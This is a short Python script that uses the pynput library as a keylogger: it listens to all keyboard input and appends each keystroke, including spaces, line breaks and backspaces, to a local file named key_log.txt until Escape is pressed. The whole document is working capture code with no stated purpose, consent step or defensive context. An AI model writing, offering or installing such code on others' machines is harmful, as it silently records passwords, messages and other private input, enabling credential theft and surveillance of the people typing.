import pynput
from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        key_str = str(key).replace("'", "")
        if key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        elif key == Key.backspace:
            f.write('<BACKSPACE>')
        else:
            f.write(key_str)

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events (optional)
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
